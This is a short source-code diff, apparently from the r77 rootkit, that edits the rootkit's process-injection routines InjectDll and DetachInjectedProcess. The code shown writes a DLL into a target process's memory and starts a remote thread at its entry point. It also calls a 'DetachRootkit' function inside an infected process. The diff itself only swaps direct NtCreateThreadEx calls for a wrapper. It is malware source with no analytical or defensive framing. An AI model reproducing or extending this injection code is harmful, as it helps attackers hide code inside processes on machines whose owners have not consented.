@@ -1,7 +1,6 @@
 #include "r77process.h"
 #include "r77def.h"
 #include "r77win.h"
-#include "r77runtime.h"
 #include <Shlwapi.h>
 #include <Psapi.h>
 
@@ -52,7 +51,7 @@ BOOL InjectDll(DWORD processId, LPBYTE dll, DWORD dllSize, BOOL fast)
 								if (WriteProcessMemory(process, allocatedMemory, dll, dllSize, NULL))
 								{
 									HANDLE thread = NULL;
-									if (NT_SUCCESS(NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
+									if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, allocatedMemory + entryPoint, allocatedMemory, 0, 0, 0, 0, NULL)) && thread)
 									{
 										if (fast)
 										{
@@ -157,7 +156,7 @@ BOOL DetachInjectedProcess(PR77_PROCESS r77Process)
 		{
 			// R77_PROCESS.DetachAddress is a function pointer to DetachRootkit()
 			HANDLE thread = NULL;
-			if (NT_SUCCESS(NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPVOID)r77Process->DetachAddress, NULL, 0, 0, 0, 0, NULL)) && thread)
+			if (NT_SUCCESS(R77_NtCreateThreadEx(&thread, 0x1fffff, NULL, process, (LPVOID)r77Process->DetachAddress, NULL, 0, 0, 0, 0, NULL)) && thread)
 			{
 				result = TRUE;
 				CloseHandle(thread);
